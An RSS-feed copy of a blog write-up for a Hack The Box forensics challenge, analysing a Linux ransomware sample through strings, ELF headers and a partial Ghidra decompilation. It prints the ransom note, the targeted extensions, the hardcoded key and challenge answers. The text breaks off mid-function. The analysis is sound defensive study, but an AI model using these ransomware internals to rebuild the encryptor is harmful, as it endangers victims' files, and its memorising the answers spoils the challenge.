<?xml version="1.0" encoding="utf-8" standalone="yes"?><?xml-stylesheet href="/feed_style.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="https://www.rssboard.org/media-rss"><channel><title>Cryptography on Shakil's Blog</title><link>https://hshakilst.github.io/tags/cryptography/</link><description>Recent content in Cryptography on Shakil's Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>Shakil Hossain - All Right Reserved.</copyright><lastBuildDate>Sat, 15 Jun 2024 04:33:24 -0400</lastBuildDate><atom:link href="https://hshakilst.github.io/tags/cryptography/index.xml" rel="self" type="application/rss+xml"/><icon>https://hshakilst.github.io/logo.svg</icon><item><title>HTB Sherlock Lockpick1</title><link>https://hshakilst.github.io/posts/htb-sherlocks/lockpick1/</link><pubDate>Sat, 15 Jun 2024 04:33:24 -0400</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/lockpick1/</guid><description><![CDATA[<h1 id="lockpick-1---malware-analysis">Lockpick 1 - Malware Analysis</h1>
<h3 id="scenario">Scenario</h3>
<p>Forela needs your help! A whole portion of our UNIX servers have been hit with what we think is ransomware. We are refusing to pay the attackers and need you to find a way to recover the files provided. Warning This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. Once the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.</p>
<h3 id="artifacts">Artifacts</h3>
<table>
<thead>
<tr>
<th>Artifact</th>
<th>MD5 Hash</th>
<th>Password</th>
</tr>
</thead>
<tbody>
<tr>
<td>lockpick1.zip</td>
<td>e14430ea647d948e3084931652f5e534</td>
<td>hacktheblue</td>
</tr>
<tr>
<td>bescrypt.zip</td>
<td>ab7388c8a51ea6c8b53cbc11bfd463f2</td>
<td>E@iwyzXK7HK&amp;</td>
</tr>
</tbody>
</table>
<h3 id="tools">Tools</h3>
<ul>
<li><a href="https://github.com/mandiant/flare-floss">flare-floss</a>: For static malware analysis.</li>
<li><a href="https://github.com/jqlang/jq">jq</a>: For querying JSON files.</li>
<li><a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra SRE</a>: For reverse engineering the malware and static analysis.</li>
<li>Sublime Text Editor</li>
<li>xxd Hex Editor</li>
<li>Visual Studio Code</li>
</ul>
<h3 id="tasks">Tasks</h3>
<ol>
<li>Please confirm the encryption key string utilised for the encryption of the files provided?</li>
<li>We have recently received an email from <a href="mailto:wbevansn1@cocolog-nifty.com">wbevansn1@cocolog-nifty.com</a> demanding to know the first and last name we have him registered as. They believe they made a mistake in the application process. Please confirm the first and last name of this applicant.</li>
<li>What is the MAC address and serial number of the laptop assigned to Hart Manifould?</li>
<li>What is the email address of the attacker?</li>
<li>City of London Police have suspiciouns of some insider trading taking part within our trading organisation. Please confirm the email address of the person with the highest profit percentage in a single trade alongside the profit percentage.</li>
<li>Our E-Discovery team would like to confirm the IP address detailed in the Sales Forecast log for a user who is suspected of sharing their account with a colleague. Please confirm the IP address for Karylin O&rsquo;Hederscoll.</li>
<li>Which of the following file extensions is not targeted by the malware? <code>.txt, .sql, .ppt, .pdf, .docx, .xlsx, .csv, .json, .xml</code></li>
<li>We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the applicants DB.</li>
<li>We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the trading backup.</li>
<li>We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the complaints file.</li>
</ol>
<h3 id="malware-analysis">Malware Analysis</h3>
<p>We have been given a directory <code>forela-criticaldata</code> that contains encrypted internal files by a ransomware. The sample of the ransomware is also given in a separate zip file <code>bescrypt.zip</code>. Our objective is to recover the encrypted files by analyzing the malware.</p>
<h4 id="static-analysis">Static Analysis</h4>
<p>First, let&rsquo;s see what kind of binary we are dealing with.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ file bescrypt3.2               
</span></span><span style="display:flex;"><span>bescrypt3.2: ELF 64-bit LSB pie executable, x86-64, version <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>SYSV<span style="color:#ff79c6">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style="color:#ff79c6">[</span>sha1<span style="color:#ff79c6">]=</span>2b6eafade391d7be39a8aff0d2e3a60aa8b6a4c2, <span style="color:#ff79c6">for</span> GNU/Linux 3.2.0, not stripped
</span></span></code></pre></div><p>It&rsquo;s an ELF 64-bit binary. You can read more about ELF binary in the Medium article mentioned in the reference section.</p>
<p>Binary Headers</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ readelf -h bescrypt3.2
</span></span><span style="display:flex;"><span>ELF Header:
</span></span><span style="display:flex;"><span>  Magic:   7f <span style="color:#bd93f9">45</span> 4c <span style="color:#bd93f9">46</span> <span style="color:#bd93f9">02</span> <span style="color:#bd93f9">01</span> <span style="color:#bd93f9">01</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> 
</span></span><span style="display:flex;"><span>  Class:                             ELF64
</span></span><span style="display:flex;"><span>  Data:                              2&#39;s complement, little endian
</span></span><span style="display:flex;"><span>  Version:                           <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>current<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  OS/ABI:                            UNIX - System V
</span></span><span style="display:flex;"><span>  ABI Version:                       <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>  Type:                              DYN <span style="color:#ff79c6">(</span>Position-Independent Executable file<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  Machine:                           Advanced Micro Devices X86-64
</span></span><span style="display:flex;"><span>  Version:                           0x1
</span></span><span style="display:flex;"><span>  Entry point address:               0x1160
</span></span><span style="display:flex;"><span>  Start of program headers:          <span style="color:#bd93f9">64</span> <span style="color:#ff79c6">(</span>bytes into file<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  Start of section headers:          <span style="color:#bd93f9">14904</span> <span style="color:#ff79c6">(</span>bytes into file<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  Flags:                             0x0
</span></span><span style="display:flex;"><span>  Size of this header:               <span style="color:#bd93f9">64</span> <span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  Size of program headers:           <span style="color:#bd93f9">56</span> <span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  Number of program headers:         <span style="color:#bd93f9">13</span>
</span></span><span style="display:flex;"><span>  Size of section headers:           <span style="color:#bd93f9">64</span> <span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  Number of section headers:         <span style="color:#bd93f9">31</span>
</span></span><span style="display:flex;"><span>  Section header string table index: <span style="color:#bd93f9">30</span>
</span></span></code></pre></div><p>Let&rsquo;s use floss and try to dump the strings of the binary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ floss bescrypt3.2 --format sc64
</span></span><span style="display:flex;"><span>INFO: floss: extracting static strings
</span></span><span style="display:flex;"><span>finding decoding <span style="color:#ff79c6">function</span> features: 100%|█████| 1/1 <span style="color:#ff79c6">[</span>00:00&lt;00:00, 498.08 functions/s, skipped <span style="color:#bd93f9">0</span> library functions<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>INFO: floss.stackstrings: extracting stackstrings from <span style="color:#bd93f9">1</span> functions
</span></span><span style="display:flex;"><span>extracting stackstrings: 100%|█████████████████████████████████████████████| 1/1 <span style="color:#ff79c6">[</span>00:00&lt;00:00, 151.76 functions/s<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>INFO: floss.tightstrings: extracting tightstrings from <span style="color:#bd93f9">0</span> functions...
</span></span><span style="display:flex;"><span>extracting tightstrings: <span style="color:#bd93f9">0</span> functions <span style="color:#ff79c6">[</span>00:00, ? functions/s<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>INFO: floss.string_decoder: decoding strings
</span></span><span style="display:flex;"><span>decoding strings: 100%|████████████████████████████████████████████████████| 1/1 <span style="color:#ff79c6">[</span>00:00&lt;00:00, 289.22 functions/s<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>INFO: floss: finished execution after 3.23 seconds
</span></span><span style="display:flex;"><span>INFO: floss: rendering results
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLARE FLOSS RESULTS <span style="color:#ff79c6">(</span>version 3.1.0<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+------------------------+------------------------------------------------------------------------------------+
</span></span><span style="display:flex;"><span>| file path              | bescrypt3.2                                                                        |
</span></span><span style="display:flex;"><span>| identified language    | unknown                                                                            |
</span></span><span style="display:flex;"><span>| extracted strings      |                                                                                    |
</span></span><span style="display:flex;"><span>|  static strings        | <span style="color:#bd93f9">127</span> <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1700</span> characters<span style="color:#ff79c6">)</span>                                                              |
</span></span><span style="display:flex;"><span>|   language strings     |   <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">(</span>   <span style="color:#bd93f9">0</span> characters<span style="color:#ff79c6">)</span>                                                              |
</span></span><span style="display:flex;"><span>|  stack strings         | <span style="color:#bd93f9">0</span>                                                                                  |
</span></span><span style="display:flex;"><span>|  tight strings         | <span style="color:#bd93f9">0</span>                                                                                  |
</span></span><span style="display:flex;"><span>|  decoded strings       | <span style="color:#bd93f9">0</span>                                                                                  |
</span></span><span style="display:flex;"><span>+------------------------+------------------------------------------------------------------------------------+
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> ──────────────────────────── 
</span></span><span style="display:flex;"><span>  FLOSS STATIC STRINGS <span style="color:#ff79c6">(</span>127<span style="color:#ff79c6">)</span>  
</span></span><span style="display:flex;"><span> ──────────────────────────── 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+-----------------------------------+
</span></span><span style="display:flex;"><span>| FLOSS STATIC STRINGS: ASCII <span style="color:#ff79c6">(</span>127<span style="color:#ff79c6">)</span> |
</span></span><span style="display:flex;"><span>+-----------------------------------+
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/lib64/ld-linux-x86-64.so.2
</span></span><span style="display:flex;"><span>rewind
</span></span><span style="display:flex;"><span>snprintf
</span></span><span style="display:flex;"><span>free
</span></span><span style="display:flex;"><span>fread
</span></span><span style="display:flex;"><span>closedir
</span></span><span style="display:flex;"><span>fopen
</span></span><span style="display:flex;"><span>strlen
</span></span><span style="display:flex;"><span>strstr
</span></span><span style="display:flex;"><span>malloc
</span></span><span style="display:flex;"><span>__libc_start_main
</span></span><span style="display:flex;"><span>remove
</span></span><span style="display:flex;"><span>__cxa_finalize
</span></span><span style="display:flex;"><span>ftell
</span></span><span style="display:flex;"><span>readdir
</span></span><span style="display:flex;"><span>fclose
</span></span><span style="display:flex;"><span>opendir
</span></span><span style="display:flex;"><span>fwrite
</span></span><span style="display:flex;"><span>strcmp
</span></span><span style="display:flex;"><span>fseek
</span></span><span style="display:flex;"><span>libc.so.6
</span></span><span style="display:flex;"><span>GLIBC_2.34
</span></span><span style="display:flex;"><span>GLIBC_2.2.5
</span></span><span style="display:flex;"><span>_ITM_deregisterTMCloneTable
</span></span><span style="display:flex;"><span>__gmon_start__
</span></span><span style="display:flex;"><span>_ITM_registerTMCloneTable
</span></span><span style="display:flex;"><span>PTE1
</span></span><span style="display:flex;"><span>u+UH
</span></span><span style="display:flex;"><span>ATSH
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>A<span style="color:#f1fa8c">\]</span>
</span></span><span style="display:flex;"><span>Error opening file: %s
</span></span><span style="display:flex;"><span>%s.24bes
</span></span><span style="display:flex;"><span>%s_note.txt
</span></span><span style="display:flex;"><span>This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment <span style="color:#ff79c6">for</span> us providing you the decryption software..
</span></span><span style="display:flex;"><span>Error creating note file: %s
</span></span><span style="display:flex;"><span>Error deleting original file: %s
</span></span><span style="display:flex;"><span>Error opening directory: %s
</span></span><span style="display:flex;"><span>%s/%s
</span></span><span style="display:flex;"><span>.txt
</span></span><span style="display:flex;"><span>.sql
</span></span><span style="display:flex;"><span>.pdf
</span></span><span style="display:flex;"><span>.docx
</span></span><span style="display:flex;"><span>.xlsx
</span></span><span style="display:flex;"><span>.csv
</span></span><span style="display:flex;"><span>.json
</span></span><span style="display:flex;"><span>.xml
</span></span><span style="display:flex;"><span>Encrypting: %s
</span></span><span style="display:flex;"><span>bhUlIshutrea98liOp
</span></span><span style="display:flex;"><span>/forela-criticaldata/
</span></span><span style="display:flex;"><span>;*3$<span style="color:#f1fa8c">&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">GCC: (Debian 12.2.0-13) 12.2.0
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Scrt1.o
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__abi_tag
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">crtstuff.c
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">deregister_tm_clones
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__do_global_dtors_aux
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">completed.0
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__do_global_dtors_aux_fini_array_entry
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">frame_dummy
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__frame_dummy_init_array_entry
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">bescrypt2.c
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__FRAME_END__
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_DYNAMIC
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__GNU_EH_FRAME_HDR
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_GLOBAL_OFFSET_TABLE_
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">free@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__libc_start_main@GLIBC_2.34
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">remove@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_ITM_deregisterTMCloneTable
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fread@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_edata
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fclose@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">opendir@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_fini
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">strlen@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">rewind@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">snprintf@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">closedir@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__data_start
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">strcmp@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">ftell@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__gmon_start__
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__dso_handle
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_IO_stdin_used
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">readdir@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">malloc@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_end
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fseek@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__bss_start
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">main
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">encrypt_file
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">process_directory
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fopen@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">fwrite@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__TMC_END__
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_ITM_registerTMCloneTable
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">__cxa_finalize@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">_init
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">strstr@GLIBC_2.2.5
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.symtab
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.strtab
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.shstrtab
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.interp
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.note.gnu.property
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.note.gnu.build-id
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.note.ABI-tag
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.gnu.hash
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.dynsym
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.dynstr
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.gnu.version
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.gnu.version_r
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.rela.dyn
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.rela.plt
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.init
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.plt.got
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.text
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.fini
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.rodata
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.eh_frame_hdr
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.eh_frame
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.init_array
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.fini_array
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.dynamic
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.got.plt
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.data
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.bss
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">.comment
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">+------------------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">| FLOSS STATIC STRINGS: UTF-16LE (0) |
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">+------------------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> ───────────────────────── 
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">  FLOSS STACK STRINGS (0)  
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> ───────────────────────── 
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> ───────────────────────── 
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">  FLOSS TIGHT STRINGS (0)  
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> ───────────────────────── 
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> ─────────────────────────── 
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">  FLOSS DECODED STRINGS (0)  
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"> ─────────────────────────── 
</span></span></span></code></pre></div><p>We can see the structure of the ELF binary, the function names it has, and some hard coded strings. Most Interesting ones are listed below:</p>
<p>Hard coded strings:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Error opening file: %s
</span></span><span style="display:flex;"><span>%s.24bes
</span></span><span style="display:flex;"><span>%s_note.txt
</span></span><span style="display:flex;"><span>This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software..
</span></span><span style="display:flex;"><span>Error creating note file: %s
</span></span><span style="display:flex;"><span>Error deleting original file: %s
</span></span><span style="display:flex;"><span>Error opening directory: %s
</span></span><span style="display:flex;"><span>%s/%s
</span></span><span style="display:flex;"><span>.txt
</span></span><span style="display:flex;"><span>.sql
</span></span><span style="display:flex;"><span>.pdf
</span></span><span style="display:flex;"><span>.docx
</span></span><span style="display:flex;"><span>.xlsx
</span></span><span style="display:flex;"><span>.csv
</span></span><span style="display:flex;"><span>.json
</span></span><span style="display:flex;"><span>.xml
</span></span><span style="display:flex;"><span>Encrypting: %s
</span></span><span style="display:flex;"><span>bhUlIshutrea98liOp
</span></span><span style="display:flex;"><span>/forela-criticaldata/
</span></span></code></pre></div><p>We found the encryption key which is <code>bhUlIshutrea98liOp</code>. Now, we need to figure out what kind of encryption we are dealing with.</p>
<p>C header files and functions load order:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>GCC: (Debian 12.2.0-13) 12.2.0
</span></span><span style="display:flex;"><span>Scrt1.o
</span></span><span style="display:flex;"><span>__abi_tag
</span></span><span style="display:flex;"><span>crtstuff.c
</span></span><span style="display:flex;"><span>deregister_tm_clones
</span></span><span style="display:flex;"><span>__do_global_dtors_aux
</span></span><span style="display:flex;"><span>completed.0
</span></span><span style="display:flex;"><span>__do_global_dtors_aux_fini_array_entry
</span></span><span style="display:flex;"><span>frame_dummy
</span></span><span style="display:flex;"><span>__frame_dummy_init_array_entry
</span></span><span style="display:flex;"><span>bescrypt2.c
</span></span><span style="display:flex;"><span>__FRAME_END__
</span></span><span style="display:flex;"><span>_DYNAMIC
</span></span><span style="display:flex;"><span>__GNU_EH_FRAME_HDR
</span></span><span style="display:flex;"><span>_GLOBAL_OFFSET_TABLE_
</span></span><span style="display:flex;"><span>free@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>__libc_start_main@GLIBC_2.34
</span></span><span style="display:flex;"><span>remove@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>_ITM_deregisterTMCloneTable
</span></span><span style="display:flex;"><span>fread@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>_edata
</span></span><span style="display:flex;"><span>fclose@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>opendir@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>_fini
</span></span><span style="display:flex;"><span>strlen@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>rewind@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>snprintf@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>closedir@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>__data_start
</span></span><span style="display:flex;"><span>strcmp@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>ftell@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>__gmon_start__
</span></span><span style="display:flex;"><span>__dso_handle
</span></span><span style="display:flex;"><span>_IO_stdin_used
</span></span><span style="display:flex;"><span>readdir@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>malloc@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>_end
</span></span><span style="display:flex;"><span>fseek@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>__bss_start
</span></span><span style="display:flex;"><span>main
</span></span><span style="display:flex;"><span>encrypt_file
</span></span><span style="display:flex;"><span>process_directory
</span></span><span style="display:flex;"><span>fopen@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>fwrite@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>__TMC_END__
</span></span><span style="display:flex;"><span>_ITM_registerTMCloneTable
</span></span><span style="display:flex;"><span>__cxa_finalize@GLIBC_2.2.5
</span></span><span style="display:flex;"><span>_init
</span></span><span style="display:flex;"><span>strstr@GLIBC_2.2.5
</span></span></code></pre></div><p>We discovered an interesting function named <code>encrypt_file</code>. Let&rsquo;s decompile the binary and look at the function&rsquo;s source code using <code>ghidra</code>.</p>
<p>encrypt_file</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">encrypt_file</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>param_1,<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>param_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  ulong uVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> iVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">size_t</span> sVar4;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> local_848 [<span style="color:#bd93f9">1024</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> local_448 [<span style="color:#bd93f9">1032</span>];
</span></span><span style="display:flex;"><span>  FILE <span style="color:#ff79c6">*</span>local_40;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>local_38;
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">size_t</span> local_30;
</span></span><span style="display:flex;"><span>  FILE <span style="color:#ff79c6">*</span>local_28;
</span></span><span style="display:flex;"><span>  ulong local_20;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_28 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">fopen</span>(param_1,<span style="color:#f1fa8c">&#34;rb&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (local_28 <span style="color:#ff79c6">==</span> (FILE <span style="color:#ff79c6">*</span>)<span style="color:#bd93f9">0x0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">printf</span>(<span style="color:#f1fa8c">&#34;Error opening file: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>,param_1);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fseek</span>(local_28,<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">2</span>);
</span></span><span style="display:flex;"><span>    local_30 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">ftell</span>(local_28);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">rewind</span>(local_28);
</span></span><span style="display:flex;"><span>    local_38 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">malloc</span>(local_30);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fread</span>(local_38,<span style="color:#bd93f9">1</span>,local_30,local_28);
</span></span><span style="display:flex;"><span>    <span style="color:#50fa7b">fclose</span>(local_28);
